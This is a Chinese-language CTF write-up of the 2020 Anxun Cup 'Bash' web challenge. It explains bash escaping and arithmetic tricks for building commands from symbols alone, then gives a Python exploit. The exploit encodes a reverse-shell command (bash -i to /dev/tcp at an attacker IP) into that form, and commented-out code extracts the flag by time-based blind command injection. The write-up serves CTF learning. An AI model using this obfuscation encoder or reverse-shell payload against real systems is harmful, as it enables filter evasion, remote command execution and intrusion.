---
title: 安洵杯wp
date: 2020-12-07 19:50:23
tags: WP
---

## 2020安洵杯线上复现WEB

## Bash

预备知识：

**$(command)**：获取command命令执行后的结果。

![image-20201207200755293](https://i.loli.net/2020/12/07/p124rVExgM9G6qb.png)

`\`后接一个数字表示ascii码等于该值的字符

![image-20201207204531392](https://i.loli.net/2020/12/07/n7D8lEHYyBhIJvq.png)

`$''`引用内容展开，执行单引号内的转义内容（单引号原本是原样引用的），这种方式会将引号内的一个或者多个[\]转义后的八进制，十六进制值展开到ASCII或Unicode字符.

`$((1+1+1))`这个会输出数字3

![image-20201207211118580](https://i.loli.net/2020/12/07/P8JVCsFtqOuL4ow.png)

`\`转义号，使得符号失去原来的意思，但是bash执行一次就会消去用于转义的转义号一个。

![image-20201207211246592](https://i.loli.net/2020/12/07/VQfnOPyeodaWxFi.png)

可以从图中看出，第二个语句，cmd将`$((1+1+1))`当作是一个字符串去匹配，因为这是引号的作用。加了转义号之后，里面的语句正常的执行了，`‘`变成了普通的符号，作为了外层的拼接字符。

![image-20201207211842187](https://i.loli.net/2020/12/07/D6cGiIArqg9maVM.png)

现在来拆解这两个shell语句

```
$\'\\1$((1+1+1+1+1+1))0\\1$((1+1+1+1+1+1))$((1+1+1))\'
```

根据上面的语法，`$''`可以将其中的转义的八进制数据展开成ascii字符，但是我们发现并没有展开。原因是`''`这个符号被我们用转义符号进行转义掉了。现在他就是普通的字符，没有什么特别用处，同理`\\`其中的这两个符号也表示成为`\`字符而已，而不是转义符。

执行完第一个cmd中自带的bash就是：

`$'\160\163'`执行完语句中本身的特俗表达，现在就是要执行整体了（如果有人好奇，为什么没有如图所示

![image-20201207212314912](https://i.loli.net/2020/12/07/NHhQX9rYOt7i8F6.png)

我劝他再看一下我上面的描述。

现在他只是一个字符串，第一个bash的命令已经执行完毕了。然后再在命令堆里拿着这个字符串去匹配，发现，屁都没有。然后就会报错。但是我如果再将这个没有转义符的字符串放到下一个bash里面，这个时候一切就又可以快乐起来。

`<<`在`$(())`表示位移运算

`2#` linux下的进制转换:https://www.cnblogs.com/dingbj/p/10140785.html

然后根据这个，我们要再`$''`中构建出命令的八进制，然后我们还要将8个数字拆了用`${##} ${#}`

表示，下面上exp

```python
import requests
n = dict()
n[0] = '$#'
n[1] = '${##}'
n[2] = '$(({n1}<<{n1}))'.format(n1=n[1])
n[3] = '$(({n2}#{n1}{n1}))'.format(n2=n[2], n1=n[1])
n[4] = '$(({n1}<<{n2}))'.format(n2=n[2], n1=n[1])
n[5] = '$(({n2}#{n1}{n0}{n1}))'.format(n2=n[2], n1=n[1], n0=n[0])
n[6] = '$(({n2}#{n1}{n1}{n0}))'.format(n2=n[2], n1=n[1], n0=n[0])
n[7] = '$(({n2}#{n1}{n1}{n1}))'.format(n2=n[2], n1=n[1])
f=''
a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_{}@'

def str_to_oct(cmd):
    s = ""
    for t in cmd:
        o = ('%s' % (oct(ord(t))))[2:]
        s+='\\'+o
    return s

def build(cmd):
    payload = "${0}<<<${0}\<\<\<\$\\\'"
    print(str_to_oct(cmd))
    s = str_to_oct(cmd).split('\\')
    print(s)
    for _ in s[1:]:
        payload+="\\\\"
        for i in _:
            payload+=n[int(i)]
    print(payload)
    return payload+'\\\''

def get_flag(url,payload):
    try:
        data = {'cmd':payload}
        r = requests.post(url,data,timeout=1.5)
    except:
        return True
    return False

with open('1.txt','w') as f:
    f.write(build('bash -i >& /dev/tcp/192.168.43.16/1234 0>&1'))
# for i in range(1,50):
#     for j in a:
#         cmd=f'cat /flag|grep ^{f+j}&&sleep 3'
#         url = "http://ip/"
#         if get_flag(url,build(cmd)):
#             break
#     f = f+j
#     print(f)
```

